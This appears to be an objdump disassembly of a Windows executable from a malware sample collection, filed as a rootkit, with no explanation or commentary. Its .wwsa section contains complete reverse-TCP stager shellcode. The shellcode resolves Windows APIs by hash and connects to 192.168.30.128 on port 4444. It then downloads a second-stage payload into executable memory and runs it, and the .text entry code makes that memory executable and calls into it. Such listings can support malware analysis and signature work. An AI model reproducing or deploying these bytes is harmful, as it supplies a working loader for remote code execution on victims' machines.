
malware_samples/rootkit/593860d764391de8a48442644bee63aa89e9891cf39c242ca82b881c163e2a7b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	51                   	push   %ecx
  401004:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401007:	50                   	push   %eax
  401008:	6a 40                	push   $0x40
  40100a:	68 00 10 00 00       	push   $0x1000
  40100f:	68 00 30 40 00       	push   $0x403000
  401014:	ff 15 00 20 40 00    	call   *0x402000
  40101a:	b9 00 30 40 00       	mov    $0x403000,%ecx
  40101f:	ff d1                	call   *%ecx
  401021:	90                   	nop
  401022:	33 c0                	xor    %eax,%eax
  401024:	8b e5                	mov    %ebp,%esp
  401026:	5d                   	pop    %ebp
  401027:	c3                   	ret

Disassembly of section .wwsa:

00405000 <.wwsa>:
  405000:	fc                   	cld
  405001:	e8 8f 00 00 00       	call   0x405095
  405006:	60                   	pusha
  405007:	31 d2                	xor    %edx,%edx
  405009:	64 8b 52 30          	mov    %fs:0x30(%edx),%edx
  40500d:	89 e5                	mov    %esp,%ebp
  40500f:	8b 52 0c             	mov    0xc(%edx),%edx
  405012:	8b 52 14             	mov    0x14(%edx),%edx
  405015:	8b 72 28             	mov    0x28(%edx),%esi
  405018:	31 ff                	xor    %edi,%edi
  40501a:	0f b7 4a 26          	movzwl 0x26(%edx),%ecx
  40501e:	31 c0                	xor    %eax,%eax
  405020:	ac                   	lods   %ds:(%esi),%al
  405021:	3c 61                	cmp    $0x61,%al
  405023:	7c 02                	jl     0x405027
  405025:	2c 20                	sub    $0x20,%al
  405027:	c1 cf 0d             	ror    $0xd,%edi
  40502a:	01 c7                	add    %eax,%edi
  40502c:	49                   	dec    %ecx
  40502d:	75 ef                	jne    0x40501e
  40502f:	52                   	push   %edx
  405030:	8b 52 10             	mov    0x10(%edx),%edx
  405033:	57                   	push   %edi
  405034:	8b 42 3c             	mov    0x3c(%edx),%eax
  405037:	01 d0                	add    %edx,%eax
  405039:	8b 40 78             	mov    0x78(%eax),%eax
  40503c:	85 c0                	test   %eax,%eax
  40503e:	74 4c                	je     0x40508c
  405040:	01 d0                	add    %edx,%eax
  405042:	8b 48 18             	mov    0x18(%eax),%ecx
  405045:	8b 58 20             	mov    0x20(%eax),%ebx
  405048:	50                   	push   %eax
  405049:	01 d3                	add    %edx,%ebx
  40504b:	85 c9                	test   %ecx,%ecx
  40504d:	74 3c                	je     0x40508b
  40504f:	31 ff                	xor    %edi,%edi
  405051:	49                   	dec    %ecx
  405052:	8b 34 8b             	mov    (%ebx,%ecx,4),%esi
  405055:	01 d6                	add    %edx,%esi
  405057:	31 c0                	xor    %eax,%eax
  405059:	c1 cf 0d             	ror    $0xd,%edi
  40505c:	ac                   	lods   %ds:(%esi),%al
  40505d:	01 c7                	add    %eax,%edi
  40505f:	38 e0                	cmp    %ah,%al
  405061:	75 f4                	jne    0x405057
  405063:	03 7d f8             	add    -0x8(%ebp),%edi
  405066:	3b 7d 24             	cmp    0x24(%ebp),%edi
  405069:	75 e0                	jne    0x40504b
  40506b:	58                   	pop    %eax
  40506c:	8b 58 24             	mov    0x24(%eax),%ebx
  40506f:	01 d3                	add    %edx,%ebx
  405071:	66 8b 0c 4b          	mov    (%ebx,%ecx,2),%cx
  405075:	8b 58 1c             	mov    0x1c(%eax),%ebx
  405078:	01 d3                	add    %edx,%ebx
  40507a:	8b 04 8b             	mov    (%ebx,%ecx,4),%eax
  40507d:	01 d0                	add    %edx,%eax
  40507f:	89 44 24 24          	mov    %eax,0x24(%esp)
  405083:	5b                   	pop    %ebx
  405084:	5b                   	pop    %ebx
  405085:	61                   	popa
  405086:	59                   	pop    %ecx
  405087:	5a                   	pop    %edx
  405088:	51                   	push   %ecx
  405089:	ff e0                	jmp    *%eax
  40508b:	58                   	pop    %eax
  40508c:	5f                   	pop    %edi
  40508d:	5a                   	pop    %edx
  40508e:	8b 12                	mov    (%edx),%edx
  405090:	e9 80 ff ff ff       	jmp    0x405015
  405095:	5d                   	pop    %ebp
  405096:	68 33 32 00 00       	push   $0x3233
  40509b:	68 77 73 32 5f       	push   $0x5f327377
  4050a0:	54                   	push   %esp
  4050a1:	68 4c 77 26 07       	push   $0x726774c
  4050a6:	89 e8                	mov    %ebp,%eax
  4050a8:	ff d0                	call   *%eax
  4050aa:	b8 90 01 00 00       	mov    $0x190,%eax
  4050af:	29 c4                	sub    %eax,%esp
  4050b1:	54                   	push   %esp
  4050b2:	50                   	push   %eax
  4050b3:	68 29 80 6b 00       	push   $0x6b8029
  4050b8:	ff d5                	call   *%ebp
  4050ba:	6a 0a                	push   $0xa
  4050bc:	68 c0 a8 1e 80       	push   $0x801ea8c0
  4050c1:	68 02 00 11 5c       	push   $0x5c110002
  4050c6:	89 e6                	mov    %esp,%esi
  4050c8:	50                   	push   %eax
  4050c9:	50                   	push   %eax
  4050ca:	50                   	push   %eax
  4050cb:	50                   	push   %eax
  4050cc:	40                   	inc    %eax
  4050cd:	50                   	push   %eax
  4050ce:	40                   	inc    %eax
  4050cf:	50                   	push   %eax
  4050d0:	68 ea 0f df e0       	push   $0xe0df0fea
  4050d5:	ff d5                	call   *%ebp
  4050d7:	97                   	xchg   %eax,%edi
  4050d8:	6a 10                	push   $0x10
  4050da:	56                   	push   %esi
  4050db:	57                   	push   %edi
  4050dc:	68 99 a5 74 61       	push   $0x6174a599
  4050e1:	ff d5                	call   *%ebp
  4050e3:	85 c0                	test   %eax,%eax
  4050e5:	74 0a                	je     0x4050f1
  4050e7:	ff 4e 08             	decl   0x8(%esi)
  4050ea:	75 ec                	jne    0x4050d8
  4050ec:	e8 67 00 00 00       	call   0x405158
  4050f1:	6a 00                	push   $0x0
  4050f3:	6a 04                	push   $0x4
  4050f5:	56                   	push   %esi
  4050f6:	57                   	push   %edi
  4050f7:	68 02 d9 c8 5f       	push   $0x5fc8d902
  4050fc:	ff d5                	call   *%ebp
  4050fe:	83 f8 00             	cmp    $0x0,%eax
  405101:	7e 36                	jle    0x405139
  405103:	8b 36                	mov    (%esi),%esi
  405105:	6a 40                	push   $0x40
  405107:	68 00 10 00 00       	push   $0x1000
  40510c:	56                   	push   %esi
  40510d:	6a 00                	push   $0x0
  40510f:	68 58 a4 53 e5       	push   $0xe553a458
  405114:	ff d5                	call   *%ebp
  405116:	93                   	xchg   %eax,%ebx
  405117:	53                   	push   %ebx
  405118:	6a 00                	push   $0x0
  40511a:	56                   	push   %esi
  40511b:	53                   	push   %ebx
  40511c:	57                   	push   %edi
  40511d:	68 02 d9 c8 5f       	push   $0x5fc8d902
  405122:	ff d5                	call   *%ebp
  405124:	83 f8 00             	cmp    $0x0,%eax
  405127:	7d 28                	jge    0x405151
  405129:	58                   	pop    %eax
  40512a:	68 00 40 00 00       	push   $0x4000
  40512f:	6a 00                	push   $0x0
  405131:	50                   	push   %eax
  405132:	68 0b 2f 0f 30       	push   $0x300f2f0b
  405137:	ff d5                	call   *%ebp
  405139:	57                   	push   %edi
  40513a:	68 75 6e 4d 61       	push   $0x614d6e75
  40513f:	ff d5                	call   *%ebp
  405141:	5e                   	pop    %esi
  405142:	5e                   	pop    %esi
  405143:	ff 0c 24             	decl   (%esp)
  405146:	0f 85 70 ff ff ff    	jne    0x4050bc
  40514c:	e9 9b ff ff ff       	jmp    0x4050ec
  405151:	01 c3                	add    %eax,%ebx
  405153:	29 c6                	sub    %eax,%esi
  405155:	75 c1                	jne    0x405118
  405157:	c3                   	ret
  405158:	bb f0 b5 a2 56       	mov    $0x56a2b5f0,%ebx
  40515d:	6a 00                	push   $0x0
  40515f:	53                   	push   %ebx
  405160:	ff d5                	call   *%ebp
  405162:	00 00                	add    %al,(%eax)
  405164:	00 00                	add    %al,(%eax)
  405166:	00 00                	add    %al,(%eax)
  405168:	90                   	nop
  405169:	51                   	push   %ecx
  40516a:	00 00                	add    %al,(%eax)
  40516c:	00 00                	add    %al,(%eax)
  40516e:	00 00                	add    %al,(%eax)
  405170:	ff                   	(bad)
  405171:	ff                   	(bad)
  405172:	ff                   	(bad)
  405173:	ff 98 51 00 00 00    	lcall  *0x51(%eax)
  405179:	20 00                	and    %al,(%eax)
	...
  40518f:	00 a6 51 00 00 00    	add    %ah,0x51(%esi)
  405195:	00 00                	add    %al,(%eax)
  405197:	00 4b 45             	add    %cl,0x45(%ebx)
  40519a:	52                   	push   %edx
  40519b:	4e                   	dec    %esi
  40519c:	45                   	inc    %ebp
  40519d:	4c                   	dec    %esp
  40519e:	33 32                	xor    (%edx),%esi
  4051a0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4051a3:	6c                   	insb   (%dx),%es:(%edi)
  4051a4:	00 00                	add    %al,(%eax)
  4051a6:	08 06                	or     %al,(%esi)
  4051a8:	56                   	push   %esi
  4051a9:	69 72 74 75 61 6c 50 	imul   $0x506c6175,0x74(%edx),%esi
  4051b0:	72 6f                	jb     0x405221
  4051b2:	74 65                	je     0x405219
  4051b4:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  4051b8:	00 10                	add    %dl,(%eax)
  4051ba:	00 00                	add    %al,(%eax)
  4051bc:	10 00                	adc    %al,(%eax)
  4051be:	00 00                	add    %al,(%eax)
  4051c0:	10 30                	adc    %dh,(%eax)
  4051c2:	16                   	push   %ss
  4051c3:	30 1b                	xor    %bl,(%ebx)
  4051c5:	30 00                	xor    %al,(%eax)
	...
